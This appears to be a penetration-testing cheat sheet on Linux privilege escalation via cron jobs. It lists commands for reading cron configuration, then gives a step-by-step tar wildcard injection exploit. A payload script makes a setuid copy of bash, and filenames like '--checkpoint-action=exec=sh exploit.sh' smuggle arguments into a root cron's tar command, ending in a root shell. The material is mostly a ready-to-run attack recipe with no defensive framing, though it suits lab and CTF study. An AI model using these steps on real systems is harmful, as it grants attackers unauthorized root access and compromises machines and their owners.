```sh
# Cron jobs
cat /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
cat /etc/cron.monthly/*
cat /etc/cron.weekly/*
cat /var/spool/cron/*
cat /var/spool/cron/crontabs/*
# List all cron jobs
crontab -l
crontab -l -u username
```

# compress **everything** wildcard

`*/2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *`

The cron job uses `*` (wildcard), meaning **anything inside the folder** will be included — **even files with weird or dangerous names**.
### Steps
1. **create a payload**
`echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > /home/andre/backup/exploit.sh`
2. **Use `chmod +s` to give it the setuid bit**
3. **Abuse `tar` with Filename Tricks**
	`tar` has a feature:
	- `--checkpoint`: tells `tar` to do something after copying a certain number of files
	- `--checkpoint-action`: tells `tar` **what to do** at each checkpoint
```
touch /home/andre/backup/--checkpoint=1
touch /home/andre/backup/--checkpoint-action=exec=sh\ exploit.sh
```
	So it becomes:
	`tar -zcf /tmp/andre_backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh exploit.sh ...`
4. **wait for cron to run** 
5. Now, just run:
```
/tmp/bash -p
```
- `-p`: tells bash to **preserve privileges**
- You now have a root shell!